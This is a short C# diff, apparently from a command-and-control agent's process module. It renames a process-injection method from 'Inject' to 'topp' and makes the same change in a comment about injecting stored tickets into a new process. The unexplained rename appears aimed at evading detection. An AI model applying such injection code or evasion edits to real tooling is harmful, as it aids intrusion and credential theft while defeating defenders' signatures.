@@ -504,7 +504,7 @@ namespace Process
             return bRet;
         }
 
-        public override bool Inject(byte[] code, string arguments = "")
+        public override bool topp(byte[] code, string arguments = "")
         {
             bool bRet = false;
             if (Handle == IntPtr.Zero)
@@ -518,7 +518,7 @@ namespace Process
             try
             {
                 var technique = _agent.GetInjectionManager().CreateInstance(code, (int)PID);
-                bRet = technique.Inject(arguments);
+                bRet = technique.topp(arguments);
             }
             catch (Exception ex)
             {
@@ -837,7 +837,7 @@ namespace Process
                 {
                     return bRet;
                 }
-                //if running an a medium int user we may want to inject stored tickets into out new process
+                //if running an a medium int user we may want to topp stored tickets into out new process
                 //if (_agent.GetIdentityManager().GetIntegrityLevel() < IntegrityLevel.HighIntegrity)
                 //{
                     DebugHelp.DebugWriteLine($"LUID prior to impersonation: {_agent.GetTicketManager().GetCurrentLuid()}");
